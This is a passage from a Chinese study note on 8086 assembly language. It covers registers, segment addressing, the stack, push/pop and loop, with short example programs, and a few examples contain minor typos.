的 ROM</h5><p>BIOS：基本输入输出系统</p><h2 id="1-15内存地址空间"><a href="#1-15内存地址空间" class="headerlink" title="1.15内存地址空间"></a>1.15内存地址空间</h2><p>存储器在物理上是独立器件，相同点：都通过 CPU 和总线相连，CPU 进行读写时都通过控制线发出内存读写命令。</p><h1 id="二、寄存器（CPU-工作原理）"><a href="#二、寄存器（CPU-工作原理）" class="headerlink" title="二、寄存器（CPU 工作原理）"></a>二、寄存器（CPU 工作原理）</h1><p>一个 16 位寄存器可以存储数据最大值为 2^16-1</p><h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a>2.1 通用寄存器</h2><p>AX 的低八位（0位-7位）构成了 AL 寄存器，高8位（8 位-15 位）构成了 AH 寄存器。</p><p>AH 和 AL 寄存器是可以独立使用的 8 位寄存器。</p><h2 id="2-2-汇编指令"><a href="#2-2-汇编指令" class="headerlink" title="2.2 汇编指令"></a>2.2 汇编指令</h2><p><strong>汇编指令不区分大小写</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,18         将18送入AX中       AX=18<br>mov ah,78将78送入AH                            AH=78<br>add ax,8将寄存器中AX中的数据加上8 AX=AX+8<br>mov ax,bx将BX中的数据送入AX中AX=BX<br>add ax,bx将AX，BX中的内容相加，结果存在AX中AX=AX+BX<br></code></pre></td></tr></table></figure><h2 id="2-3-物理地址"><a href="#2-3-物理地址" class="headerlink" title="2.3 物理地址"></a>2.3 物理地址</h2><p>CPU访问内存单元时给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，这个唯一地址成为物理地址。</p><h2 id="2-4-16-位结构的-CPU"><a href="#2-4-16-位结构的-CPU" class="headerlink" title="2.4 16 位结构的 CPU"></a>2.4 16 位结构的 CPU</h2><p>16 位结构运算器一次最多可以处理 16 位数据，寄存器最大宽度为 16 位，寄存器和运算器之间的通路是 16 位的。</p><p><strong>地址加法器工作原理</strong></p><p>地址加法器合成物理地址的方法：<strong>物理地址&#x3D;段地址x16+偏移地址</strong></p><p>移位次数和各种形式数据关系：几进制左移就乘以几</p><h2 id="2-5-段的概念"><a href="#2-5-段的概念" class="headerlink" title="2.5 段的概念"></a>2.5 段的概念</h2><p>将若干地址连续的内存单元看成一个段</p><p>1）一个段的起始地址一定是 16 的倍数.</p><p>2）偏移地址位 16 位，16 位地址的寻址能力为 64k，所以一个段的最大长度为 64k，    2^16&#x3D;64</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>CPU 访问内存单元时，必须提供物理地址</p><p>CPU 可以通过不同的段地址和偏移地址组成物理地址</p><h2 id="2-6-段寄存器"><a href="#2-6-段寄存器" class="headerlink" title="2.6 段寄存器"></a>2.6 段寄存器</h2><p>段寄存器是提供段地址，8086CPU 有四个段寄存器：CS，DS，SS，ES，当 8086CPU 要访问内存时，由这四个段寄存器提供内存单元的段地址。</p><p>CS 为代码段寄存器，IP 为指令指针寄存器。</p><h2 id="2-7-CS-和-IP"><a href="#2-7-CS-和-IP" class="headerlink" title="2.7 CS 和 IP"></a>2.7 CS 和 IP</h2><p>CPU 将 CS 和 IP 中的内容当作指令的段地址</p><p><strong>CS 存放指令的段地址，IP 存放指令的偏移地址</strong></p><p><strong>同时</strong>修改 CS、IP 的内容：</p><p><strong>jmp 段地址：偏移地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 2AE3:3#跑到2AE33<br><br>jmp 3:0B16#跑到00B46H3=00030<br></code></pre></td></tr></table></figure><p>功能：用指令中给出的段地址修改 CS，偏移地址修改 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">仅修改IP内容：jmp 某一合法寄存器<br><br>jmp ax(类似于mov IP,ax)<br><br>jmp bx<br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,200H      jmp ax<br></code></pre></td></tr></table></figure><p>功能：用寄存器中的值修改 IP</p><h2 id="2-8-代码段"><a href="#2-8-代码段" class="headerlink" title="2.8 代码段"></a>2.8 代码段</h2><p>将一组内存单元定义为一个段</p><p>CPU 只认被 CS：IP 指向的内存单元中的内容为指令</p><h1 id="三、寄存器（内存访问）"><a href="#三、寄存器（内存访问）" class="headerlink" title="三、寄存器（内存访问）"></a>三、寄存器（内存访问）</h1><h2 id="3-1-内存中字的存储"><a href="#3-1-内存中字的存储" class="headerlink" title="3.1 内存中字的存储"></a>3.1 内存中字的存储</h2><p>低地址存低位，高地址存高位</p><p>字型考虑两个字节</p><p>两个连续的内存单元，<strong>N 号单元和 N+1</strong> 可以看成两个内存单元，也可以看成一个地址为 N 的字单元中的高位字节单元和低位字节单元。</p><h2 id="3-2-DS-和-address"><a href="#3-2-DS-和-address" class="headerlink" title="3.2 DS 和 [address]"></a>3.2 DS 和 [address]</h2><p>DS 段寄存器存放要访问数据的段地址</p><p>mov 指令能**1.将数据直接送入寄存器 **</p><p>​<strong>2.将寄存器的内容送入另一个寄存器</strong></p><p>​<strong>3.将内存单元的内容传入一个寄存器</strong></p><p>mov 指令能将<strong>一个内存单元的内容</strong>送入一个寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 寄存器名,内存单元地址<br>e.g   <br>mov bx,1000H<br>mov ds,bx<br>mov a1,[0]//内存单元偏移地址为 0，段地址默认放在 ds 中<br>mov ds,1000H //错误表达<br>8086CPU 不支持直接将数据送入段寄存器操作，用 bx 进行中转<br></code></pre></td></tr></table></figure><p><strong>数据-&gt;通用寄存器-&gt;段寄存器</strong></p><p>内存单元到寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 寄存器名，内存单元地址<br></code></pre></td></tr></table></figure><p>寄存器到内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 内存单元地址，寄存器名<br></code></pre></td></tr></table></figure><p>将 a1 中的数据传入内存单元10000H 中</p><p>10000H-&gt;1000:0 地址1000H，偏移地址为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov [0],a1<br></code></pre></td></tr></table></figure><h2 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3 字的传送"></a>3.3 字的传送</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov ax,[0]//1000:0处的字型数据送入ax<br>mov [0],cx//cx中的16位数据送到1000:0处<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c92c75e501ca30e3.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/e95d6014994bccc2.png"></p><h2 id="3-4-mov、add、sub-指令"><a href="#3-4-mov、add、sub-指令" class="headerlink" title="3.4 mov、add、sub 指令"></a>3.4 mov、add、sub 指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov/add/sub  寄存器，数据mov ax,8<br>mov/add/sub  寄存器，寄存器mov ax,bx<br>mov/add/sub  寄存器，内存单元mov ax,[0]<br>mov/add/sub  内存单元，寄存器mov [0],ax<br>mov/add/sub  段寄存器，寄存器mov ds,ax<br></code></pre></td></tr></table></figure><h2 id="3-5-数据段"><a href="#3-5-数据段" class="headerlink" title="3.5 数据段"></a>3.5 数据段</h2><p>将 123B0H~123B9H 的内存单元定义为数据段，累加这个数据段 的前三个单元的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax//将123BH送入ds中，作为数据段的段地址<br>mov a1,0//用a1存放累加结果<br>add a1,[0]//将数据段第一个单元（偏移地址为0）中的数值加到a1中<br>add a1,[1]//以此类推<br>add a1,[2]<br></code></pre></td></tr></table></figure><p>eg.写几条指令，累加数据段中的前三个字型数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax<br>mov ax,0<br>add ax,[0]<br>add ax,[2]<br>add ax,[4]<br><br>//一个字占两个单元，偏移地址为0，2，4<br></code></pre></td></tr></table></figure><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><ul><li>字在内存中存储时，需要两个连续的内存单元，低位字节放低地址单元中，高位放高地址中</li><li>mov 指令中只给出单元的偏移地址，段地址默认在 DS 寄存器中</li><li>内存和寄存器传字型数据时，高地址单元和高 8 位寄存器、低地址单元和低 8 位寄存器相对应</li><li>mov&#x2F;sub&#x2F;add 有两个操作对象指令，jmp 只有一个</li></ul><h2 id="3-6-栈"><a href="#3-6-栈" class="headerlink" title="3.6 栈"></a>3.6 栈</h2><p>先进后出</p><h2 id="3-7-CPU提供的栈机制"><a href="#3-7-CPU提供的栈机制" class="headerlink" title="3. 7 CPU提供的栈机制"></a>3. 7 CPU提供的栈机制</h2><ul><li><p>8086CPU 入栈和出栈都是以<strong>字</strong>为单位的</p></li><li><p>push ax 是将寄存器的数据送入栈中，pop ax 表示从栈顶取出数据送入 ax</p></li><li><p>段寄存器 SS 和寄存器 SP，<strong>栈顶的段地址存放在 SS 中，偏移地址存放在SP中</strong>，CPU 从 SS 和 SP 中得到栈顶的地址</p></li><li><p><strong>任意时刻，SS:SP 指向栈顶元素</strong></p></li></ul><h5 id="push-ax-执行步骤："><a href="#push-ax-执行步骤：" class="headerlink" title="push ax 执行步骤："></a>push ax 执行步骤：</h5><p>​1）SP&#x3D;SP-2,SS:SP 指向当前栈顶前面的单元，以此为新的栈顶</p><p>​2）将 ax 中的内容送入SS:SP 指向的内存单元处，SS:SP 此时指向新栈顶</p><p><img src="https://img.dkdun.cn/v1/2025/12/7abce8d3ed075e5c.png"></p><p>将 10000H~1000FH 当作栈，SS&#x3D;1000H，栈空间大小为16字节。任意时刻 SS:SP 指向栈顶，当栈中只有一个元素时，SS&#x3D;1000H，SP&#x3D;000EH。栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2，SP 原来为 000EH，后 SP&#x3D;0010H，所以栈为空时，SS&#x3D;1000H,SP&#x3D;10H</p><p><img src="https://img.dkdun.cn/v1/2025/12/2ec88a03c45bf2ad.png"></p><p>当栈为空时，也就不存在栈顶元素。SS:SP就只能指向最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元地址为1000:000E,所以栈空时，SP&#x3D;0010H</p><h5 id="pop-ax步骤："><a href="#pop-ax步骤：" class="headerlink" title="pop ax步骤："></a>pop ax步骤：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) 将 SS:SP 指向的内存单元处的数据送入ax中<br>1) SP=SP+2，SS:SP指向当前栈下面单元，以此为栈顶<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dac4293593baecdf.png"></p><p>出栈后，SS：SP 指向新的栈顶 1000EH，pop 操作前的栈顶元素，1000CH 处的 2266H 依然存在。但已经不在栈中。再次执行 push 等入栈指令后，SS：SP 移至1000CH，并写入新的数据，将被覆盖</p><h2 id="3-8-栈顶超界的问题"><a href="#3-8-栈顶超界的问题" class="headerlink" title="3.8 栈顶超界的问题"></a>3.8 栈顶超界的问题</h2><p>注意入栈出栈时超界问题</p><h2 id="3-9-push、pop指令"><a href="#3-9-push、pop指令" class="headerlink" title="3.9 push、pop指令"></a>3.9 push、pop指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 寄存器 //将一个寄存器的数据入栈<br>pop  寄存器//用一个寄存器接收出栈的数据<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 段寄存器//将一个段寄存器中的数据入栈<br>pop 段寄存器//用段寄存器接收数据<br>push 内存单元//将一个内存单元处的字入栈<br>pop 内存单元 //用一个内存单元接收数据<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">e.g.<br>mov ax,1000H<br>mov ds,ax<br>push [0]//将1000:0处的字压入栈中<br>pop [2]//出栈的数据放入1000:2处<br></code></pre></td></tr></table></figure><p>指令执行时，CPU 要知道内存单元的地址，可以在 push、pop 指令中给出内存单元的偏移地址，段指令在执行时，CPU 从 ds 中获得</p><p>e.g</p><ol><li>将 10000H~1000FH 这段空间当作栈，初始状态栈为空，将 AX，BX，DX 中的数据入栈</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax//设置栈的段地址，SS=1000H,不能直接向段寄存器SS中送入数据，所以用ax中转<br>mov sp,0010H//设置栈顶的偏移地址，栈为空，所以sp=0010H<br>push ax<br>push bx<br>push dx<br></code></pre></td></tr></table></figure><ol start="2"><li><p>将 10000H~1000FH 这段空间当作栈，初始状态是空的，AX&#x3D;001AH，BH&#x3D;001BH，将 AX，BX 的数据入栈，然后将 AX、BX 清零，从栈中恢复 AX、BX 原来的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax<br>mov sp,0010H//初始化栈<br><br>mov ax,001AH<br>mov bx,001BH<br><br>push ax<br>push bx//ax,bx入栈<br><br>sub ax,ax//ax清零，也可以用mov ax,0<br>sub bx,bx<br><br>pop bx//恢复数据，当前栈顶为bx中的内容001BH，ax的001AH在栈顶下面，所以先pop bx 再pop ax<br>pop ax<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-10-栈段"><a href="#3-10-栈段" class="headerlink" title="3.10 栈段"></a>3.10 栈段</h2><p>一段内存当作栈，所以为栈段</p><ol><li><p>将 10000H~1000FH 中的八个字，逆序复制到 20000H-2000FH 中</p></li><li><p><img src="https://img.dkdun.cn/v1/2025/12/94ec61152f16187c.png"></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ds,ax<br>mov ax,2000H<br>mov ss,ax<br>mov sp,10010H<br>push [0]<br>push [2]<br>push [4]<br>push [6]<br>push [8]<br>push [A]<br>push [C]<br>push [E]<br></code></pre></td></tr></table></figure><p>将 10000H~1000FH 中的八个字，逆序复制到 20000H-2000FH 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov ax,1000H<br>mov ss,ax<br>mov sp,0<br>pop [E]<br>pop [C]<br>pop [A]<br>pop [8]<br>pop [6]<br>pop [4]<br>pop [2]<br>pop [0]<br></code></pre></td></tr></table></figure><h1 id="四、第一个程序"><a href="#四、第一个程序" class="headerlink" title="四、第一个程序"></a>四、第一个程序</h1><h2 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2 源程序"></a>4.2 源程序</h2><h3 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="1. 伪指令"></a>1. 伪指令</h3><p><strong>汇编语言中有汇编指令和伪指令。</strong></p><ul><li>汇编指令：有对应的机器码指令，可以被编译为机器指令，最终被 CPU 所执行。</li><li>伪指令：没有对应的机器指令，不被 CPU 执行。由编译器执行指令，进行相关编译工作。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg//将代码段codesg和CPU的段寄存器cs联系<br>codesg segment//定义一个段，段名为codesg<br>mov ax,0123H<br>mov bx,0456H<br>add ax,bx<br>add ax,ax<br>mov ax,4c00H<br>int 21H<br>codesg ends//段结束<br>end//程序结束<br></code></pre></td></tr></table></figure><p>a. segment 和 ends 是成对使用的伪指令，segment 和 ends 定义一个段，格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">段名 segment<br>:<br>段名 ends<br></code></pre></td></tr></table></figure><p>b. end 表示一个汇编程序结束</p><p>c. assume 说明某段寄存器和程序中的某一个用 segment…ends 定义的段相联</p><h3 id="2-源程序中的程序"><a href="#2-源程序中的程序" class="headerlink" title="2. 源程序中的程序"></a>2. 源程序中的程序</h3><h3 id="3-标号"><a href="#3-标号" class="headerlink" title="3. 标号"></a>3. 标号</h3><p>如“codesg”，一个标号代表了一个地址，codesg 在 segment 前面，作为一个段名称，这个名称最终被编译、连接程序处理为一个段的段地址。</p><h3 id="4-程序的结构"><a href="#4-程序的结构" class="headerlink" title="4. 程序的结构"></a>4. 程序的结构</h3><p>编写运算2^3。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:abc//将abc和cs联系起来<br>abc segment//定义一个程序段<br>mov ax,2<br>add ax,ax<br>add ax,ax<br>abc ends<br>end//程序结束<br></code></pre></td></tr></table></figure><h3 id="5-程序的返回"><a href="#5-程序的返回" class="headerlink" title="5. 程序的返回"></a>5. 程序的返回</h3><p>一个程序结束后，将 CPU 的控制权交换给它得以运行的程序，这个过程称为程序返回</p><table><thead><tr><th>目的</th><th>相关指令</th><th>指令性质</th><th>指令执行者</th></tr></thead><tbody><tr><td>通知编译器一个段的结束</td><td>段名 ends</td><td>伪指令</td><td>编译时编译器</td></tr><tr><td>通知编译器程序结束</td><td>end</td><td>伪指令</td><td>编译时由编译器</td></tr><tr><td>程序返回</td><td>mov ax,4cooH  int 21H</td><td>伪指令</td><td>执行时由CPU</td></tr></tbody></table><h2 id="4-3-编辑源程序"><a href="#4-3-编辑源程序" class="headerlink" title="4.3 编辑源程序"></a>4.3 编辑源程序</h2><p>DOS 中有一个程序 command.com，这个程序在 DOS 中称为命令解释器，也就是 DOS 系统的 shell</p><p>汇编程序从写出到执行过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">编程 -&gt; 1.asm-&gt; 编译 -&gt; 1.obj -&gt; 连接 -&gt; 1.exe -&gt; 加载 -&gt; 内存中的程序 -&gt; 运行<br>(Edit)   (masm)   (link)  (command) (CPU)<br></code></pre></td></tr></table></figure><h1 id="五、-BX-和-loop-指令"><a href="#五、-BX-和-loop-指令" class="headerlink" title="五、[BX] 和 loop 指令"></a>五、[BX] 和 loop 指令</h1><p>1.[bx] 和 [0] 类似，偏移地址为 0</p><p>2.[bx] 表示一个内存单元，偏移地址在 bx 中</p><p>3.loop 循环</p><p>4.”（）“符号三种类型：**a)**寄存器名</p><p>​**b)**段寄存器名 </p><p>​**c)**内存单元物理地址（一个20位数据）</p><p>e.g</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ax内容位0010H，可以描述为：(ax)=0010H<br>2000:1000处的内容为0010H，描述为：(21000H)=0010H<br>mov ax,[2]描述为(ax)=((ds)*16+2)<br>mov [2],ax描述为((ds)*16+2)=ax<br>add ax,2描述为(ax)=(ax)+2<br>add ax,bx描述为(ax)=(ax)+(bx)<br>push ax 描述为 (sp)=(sp)-2((ss)*16+(sp))=(ax)<br>pop ax描述为(ax)=((ss)*16+(sp))(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>5.”(X)“中表示数据有两种类型：字节和字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">比如(al)、(bl)、(cl)等得到的数据为字节<br>(ds)、(ax)、(bx)等得到的数据为字<br>(al)=(20000H)，则(20000H)得到的数据为字节型<br>(ax)=(20000H)，则(20000H)得到的为字型<br></code></pre></td></tr></table></figure><p>6.约定符号 idata 表示常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[idata]代表 mov ax,[1]、mov ax,[2]、mov ax,[3]等<br>mov bx,idata代表mov bx,1、mov bx,2、mov bx,3等<br>mov ds,idata代表mov ds,1、mov ds,2等，都是非法指令<br></code></pre></td></tr></table></figure><h3 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1 [BX]"></a>5.1 [BX]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx]<br>bx中存放数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处，即:((ds)*16+(bx))=(ax)<br></code></pre></td></tr></table></figure><p>e.g 写出程序执行后，21000H~21007H 单元中的内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc40b0af9b9b9006.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H//ds=2000H,bx=1000H<br><br>mov ax,[bx]//将2000:1000处的字型数据送入ax中。ax=00beH<br><br>inc bx<br>inc bx//bx=1002H<br><br>mov [bx],ax//ds=2000H,bx=1002H,将ax内容送入2000:1002处。2000:1002内容为BE，2000:1003内容为00<br>inc bx<br>inc bx//bx=1004H<br><br>mov [bx],ax//2000:1004内容为BE，2000:1004内容为00<br><br>inc bx//bx=1005H<br><br>mov [bx],al//ds=2000H,bx=1005H,将al中的数据送入2000:1005处。2000:1005单元的内容为BE<br><br>inc bx<br>mov [bx],al//bx=1006H,2000:1006单元的内容为BE<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/13d635b29f0a5e87.png"></p><h3 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2 Loop指令"></a>5.2 Loop指令</h3><ol><li><p>格式：loop  标号</p></li><li><p>CPU 执行指令时要进行两步操作：a. (cx)&#x3D;(cx)-1  b. 判断 cx 中的值，不为零则转至标号处执行程序，如果为零则向下执行。</p></li></ol><p>e,g 计算2^2，结果存在ax中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code sgement<br>mov ax,2<br>add ax,ax<br>mov ax,4c00h<br>int  21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>e.g 计算2^12,结果存在 ax 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,2<br><br>mov cx,11<br>s: add ax,ax//用s标识了一个地址，地址处有一条指令：add ax,ax<br>loop s//判断(cx)=(cx)-1，不为0转到s所标识的地址处执行，如果为0就执行下一条指令，下一条为mov ax,4c00h<br>//执行loop s时，首先将(cx)-1，不为0就转到s处<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>cx 和 loop 指令配合实现循环3要点：</p><p>​1）在 cx 中存放循环次数</p><p>​2）loop 指令中的标号所标识地址要在前面</p><p>​3）要循环执行的程序段，要写在标号和 loop 指令的中间</p><p>框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov cx,循环次数<br>s:<br>循环执行的程序段<br>loop s<br></code></pre></td></tr></table></figure><p>e.g 用加法计算123*236,结果存在ax中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0<br>mov cx,236<br>s:add ax,123<br>loop s<br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-5-loop-和-bx-的联合应用"><a href="#5-5-loop-和-bx-的联合应用" class="headerlink" title="5.5 loop 和 [bx] 的联合应用"></a>5.5 loop 和 [bx] 的联合应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax<br>mov bx,0//初始化ds:bx指向ffff:0<br><br>mov dx,0//初始化累加寄存器dx,(dx)=0<br><br>mov cx,12//初始化循环计数寄存器cx,(cx)=12<br><br>s:mov al,[bx]<br>mov ah,0<br>add dx,ax//间接向dx中加上((ds)*16+(bx))单元的数值<br>inc bx//ds:bx指向下一个单元<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-6-段前缀"><a href="#5-6-段前缀" class="headerlink" title="5.6 段前缀"></a>5.6 